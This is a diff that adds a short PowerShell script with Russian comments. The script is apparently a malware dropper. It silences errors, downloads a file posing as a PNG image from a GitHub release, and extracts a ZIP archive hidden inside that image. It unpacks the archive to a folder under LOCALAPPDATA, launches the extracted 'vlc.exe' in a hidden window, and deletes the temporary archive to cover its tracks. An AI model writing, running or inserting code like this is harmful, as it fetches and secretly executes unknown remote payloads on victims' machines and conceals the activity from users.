@@ -1,0 +1,23 @@
+$ErrorActionPreference = 'SilentlyContinue'
+$u = "https://github.com/mahmed9203/under888/releases/download/v1.1/data.png"
+$z = $env:TEMP + "\v.zip"
+$p = $env:LOCALAPPDATA + "\V_Up"
+
+# Скачивание
+(New-Object Net.WebClient).DownloadFile($u, $z)
+
+# Извлечение ZIP из PNG
+$b = [IO.File]::ReadAllBytes($z)
+$o = [BitConverter]::ToString($b).Replace('-','').IndexOf('504B0304')/2
+
+if ($o -ge 0) {
+    [IO.File]::WriteAllBytes($z, $b[$o..($b.Length-1)])
+    if (!(Test-Path $p)) { New-Item -Path $p -ItemType Directory -Force }
+    
+    # Распаковка и запуск
+    Expand-Archive -Path $z -DestinationPath $p -Force
+    Start-Process -FilePath ($p + '\vlc.exe') -ArgumentList '--intf dummy' -WorkingDirectory $p -WindowStyle Hidden
+    
+    # Подчищаем за собой временный архив
+    Remove-Item $z -Force
+}
